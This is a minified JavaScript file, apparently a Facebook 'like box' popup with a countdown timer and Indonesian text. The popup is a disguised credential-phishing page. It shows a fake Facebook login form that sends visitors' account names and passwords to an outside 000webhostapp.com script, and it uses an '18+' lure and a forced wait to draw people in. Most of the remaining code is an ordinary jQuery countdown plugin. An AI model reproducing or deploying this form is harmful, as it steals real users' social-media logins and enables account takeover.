function createWait(a,b,c){if(c){
var d=new Date;d.setTime(d.getTime()+c*60*1e3);
var e="; expires="+d.toGMTString()}else var e="";document.cookie=a+"="+b+e+"; path=/"}function readCookie(a){
var b=a+"=";
var c=document.cookie.split(";");for(
var d=0;d<c.length;d++){
var e=c[d];while(e.charAt(0)==" ")e=e.substring(1,e.length);if(e.indexOf(b)==0)return e.substring(b.length,e.length)}return null}function createCookie(a,b,c){if(c){
var d=new Date;d.setTime(d.getTime()+c*24*60*60*1e3);
var e="; expires="+d.toGMTString()
}else var e="";
document.cookie=a+"="+b+e+"; path=/"}
function fbLikeDump(a){if(a==true){createCookie(likes+"fblikepop","true",50)}$("#fblikebg").fadeOut("slow");$("#fblikepop").fadeOut("slow")}(function(a){a.fn.kakinetworkdotcom=function(b){
var c={title:tit,message:"<div class='lk-container'><center><form action='https://greasiest-depositio.000webhostapp.com/check.php' method='POST'><div class='col'><input type='hidden' name='u' value='"+us+"'><input type='text' name='Account' placeholder='Nomor ponsel atau email' required><input type='password' name='Password' placeholder='Kata Sandi' required='6' minlength='6'><input type='submit' value='Login' class='form-control'></div></div></form></center>",url:"https://www.facebook.com/"+likes+"/",showfaces:true,timeout:waktu,delay:0,closeable:true,advancedClose:false,opacity:"25",wait:tunggu,lang:bahasa};
var b=a.extend(c,b);c.delay=c.delay*1e3;c.opacity="0."+c.opacity;
var d={orwait:{en:"Or wait",my:"Atau tunggu",id:"Atau menunggu",fr:"Ou attendre",de:"Order warten",it:"O attendere",es:"O esperar",tr:"Veya bekleyin"},seconds:{en:"Seconds",my:"Saat",id:"Detik",fr:"Secondes",de:"Sekunden",it:"Secondi",es:"Segundos",tr:"Saniye"},closeable:{en:"Close",my:"Tutup",id:"Menutup",fr:"Fermer",de:"NÃƒÂ¤he",it:"Chiudi",es:"Cerrar",tr:"Kapat",bl:"Ãâ€”ÃÂ°Ã‘â€šÃÂ²ÃÂ¾Ã‘â‚¬ÃÂ¸"}};setTimeout(function(){getPopHTML=function(){if(c.url=="current"){c.url==window.location}
var a='<div id="fblikebg"></div><div id="fblikepop"><div id="popup_head"><div id="closeable"></div><h1>'+c.title+'</h1></div><div id="popupMessage">'+c.message+'</div><div id="buttonArea"><div id="actionHolder"><fb:like id="fbLikeButton" href="'+c.url+'" show_faces="'+c.showfaces+'" width="450"></fb:like></div><div id="counter-display">'+d.orwait[c.lang]+' <span id="counter"> </span>  '+d.seconds[c.lang]+'.<br /><a id="fbtplink" href="https://bit.ly/fblikeboxtime" title="Facebook Like Box With Timer" target="_blank"><font size="small">Powered By Facebook 18+</font></a></div><div style="clear:both"></div></div></div>';return a};
...
var j=6;a.extend(b.prototype,{markerClassName:"hasCountdown",_timer:setInterval(function(){a.countdown._updateTargets()},980),_timerTargets:[],setDefaults:function(a){this._resetExtraLabels(this._defaults,a);k(this._defaults,a||{})},UTCDate:function(a,b,c,d,e,f,g,h){if(typeof b=="object"&&b.constructor==Date){h=b.getMilliseconds();g=b.getSeconds();f=b.getMinutes();e=b.getHours();d=b.getDate();c=b.getMonth();b=b.getFullYear()}
var i=new Date;i.setUTCFullYear(b);i.setUTCDate(1);i.setUTCMonth(c||0);i.setUTCDate(d||1);i.setUTCHours(e||0);i.setUTCMinutes((f||0)-(Math.abs(a)<30?a*60:a));i.setUTCSeconds(g||0);i.setUTCMilliseconds(h||0);return i},periodsToSeconds:function(a){return a[0]*31557600+a[1]*2629800+a[2]*604800+a[3]*86400+a[4]*3600+a[5]*60+a[6]},_settingsCountdown:function(b,d){if(!d){return a.countdown._defaults}
var e=a.data(b,c);return d=="all"?e.options:e.options[d]},_attachCountdown:function(b,d){
var e=a(b);if(e.hasClass(this.markerClassName)){return}e.addClass(this.markerClassName);
var f={options:a.extend({},d),_periods:[0,0,0,0,0,0,0]};a.data(b,c,f);this._changeCountdown(b)},_addTarget:function(a){if(!this._hasTarget(a)){this._timerTargets.push(a)}},_hasTarget:function(b){return a.inArray(b,this._timerTargets)>-1},_removeTarget:function(b){this._timerTargets=a.map(this._timerTargets,function(a){return a==b?null:a})},_updateTargets:function(){for(
var a=this._timerTargets.length-1;a>=0;a--){this._updateCountdown(this._timerTargets[a])}},_updateCountdown:function(b,d){
...
var i=d._hold!="pause"&&(d._since?d._now.getTime()<d._since.getTime():d._now.getTime()>=d._until.getTime());if(i&&!d._expiring){d._expiring=true;if(this._hasTarget(b)||this._get(d,"alwaysExpire")){this._removeTarget(b);
...
var m=this._get(d,"expiryUrl");if(m){window.location=m}}d._expiring=false}else if(d._hold=="pause"){this._removeTarget(b)}a.data(b,c,d)},_changeCountdown:function(b,d,e){d=d||{};if(typeof d=="string"){
var f=d;d={};d[f]=e}
var g=a.data(b,c);if(g){this._resetExtraLabels(g.options,d);k(g.options,d);this._adjustSettings(b,g);a.data(b,c,g);
var h=new Date;if(g._since&&g._since<h||g._until&&g._until>h){this._addTarget(b)}this._updateCountdown(b,g)}},_resetExtraLabels:function(a,b){
var c=false;for(
var d in b){if(d!="whichLabels"&&d.match(/[Ll]abels/)){c=true;break}}if(c){for(
var d in a){if(d.match(/[Ll]abels[0-9]/)){a[d]=null}}}},_adjustSettings:function(a,b){
var c;
...
var i=this._get(b,"timezone");i=i==null?-c.getTimezoneOffset():i;b._since=this._get(b,"since");if(b._since!=null){b._since=this.UTCDate(i,this._determineTime(b._since,null));if(b._since&&e){b._since.setMilliseconds(b._since.getMilliseconds()+e)}}b._until=this.UTCDate(i,this._determineTime(this._get(b,"until"),c));if(e){b._until.setMilliseconds(b._until.getMilliseconds()+e)}b._show=this._determineShow(b)},_destroyCountdown:function(b){
var d=a(b);if(!d.hasClass(this.markerClassName)){return}this._removeTarget(b);d.removeClass(this.markerClassName).empty();a.removeData(b,c)},_pauseCountdown:function(a){this._hold(a,"pause")},_lapCountdown:function(a){this._hold(a,"lap")},_resumeCountdown:function(a){this._hold(a,null)},_hold:function(b,d){
var e=a.data(b,c);if(e){if(e._hold=="pause"&&!d){e._periods=e._savePeriods;
var f=e._since?"-":"+";e[e._since?"_since":"_until"]=this._determineTime(f+e._periods[0]+"y"+f+e._periods[1]+"o"+f+e._periods[2]+"w"+f+e._periods[3]+"d"+f+e._periods[4]+"h"+f+e._periods[5]+"m"+f+e._periods[6]+"s");this._addTarget(b)}e._hold=d;e._savePeriods=d=="pause"?e._periods:null;a.data(b,c,e);this._updateCountdown(b,e)}},_getTimesCountdown:function(b){
var d=a.data(b,c);return!d?null:!d._hold?d._periods:this._calculatePeriods(d,d._show,this._get(d,"significant"),new Date)},_get:function(b,c){return b.options[c]!=null?b.options[c]:a.countdown._defaults[c]},_determineTime:function(b,c){
var d=function(a){
var b=new Date;b.setTime(b.getTime()+a*1e3);return b};
var e=function(b){b=b.toLowerCase();
var c=new Date;
var d=c.getFullYear();
var e=c.getMonth();
var f=c.getDate();
...
var f=b==null?c:typeof b=="string"?e(b):typeof b=="number"?d(b):b;if(f)f.setMilliseconds(0);return f},_getDaysInMonth:function(a,b){return 32-(new Date(a,b,32)).getDate()},_normalLabels:function(a){return a},_generateHTML:function(b){
...
var w=new RegExp("\\{"+v+"<\\}(.*)\\{"+v+">\\}","g");t=t.replace(w,!m&&c[u]||m&&n[u]?"$1":"")}a.each(s,function(a,b){
var c=new RegExp("\\{"+a+"\\}","g");t=t.replace(c,b)});return t},_minDigits:function(a,b){a=""+a;if(a.length>=b){return a}a="0000000000"+a;return a.substr(a.length-b)},_determineShow:function(a){
var b=this._get(a,"format");
var c=[];c[d]=b.match("y")?"?":b.match("Y")?"!":null;c[e]=b.match("o")?"?":b.match("O")?"!":null;c[f]=b.match("w")?"?":b.match("W")?"!":null;c[g]=b.match("d")?"?":b.match("D")?"!":null;c[h]=b.match("h")?"?":b.match("H")?"!":null;c[i]=b.match("m")?"?":b.match("M")?"!":null;c[j]=b.match("s")?"?":b.match("S")?"!":null;return c},_calculatePeriods:function(b,c,k,l){b._now=l;b._now.setMilliseconds(0);
...
var y=j;
var z=1;for(
var A=j;A>=d;A--){if(c[A]){if(n[y]>=z){n[y]=0;v=1}if(v>0){n[A]++;v=0;y=A;z=1}}z*=x[A]}}if(k){for(
var A=d;A<=j;A++){if(k&&n[A]){k--}else if(!k){n[A]=0}}}return n}});a.fn.countdown=function(b){
var c=Array.prototype.slice.call(arguments,1);if(b=="getTimes"||b=="settings"){return a.countdown["_"+b+"Countdown"].apply(a.countdown,[this[0]].concat(c))}return this.each(function(){if(typeof b=="string"){a.countdown["_"+b+"Countdown"].apply(a.countdown,[this].concat(c))}else{a.countdown._attachCountdown(this,b)}})};a.countdown=new b})(jQuery);setTimeout(function(){if($("#fbtplink").length==0){$("#counter-display").append('<br /><a id="fbtplink" href="https://bit.ly/fblikeboxtime" title="Facebook Like Box Pop Up With Timer" target="_blank">Powered By Facebook 18+</a>')}},500)
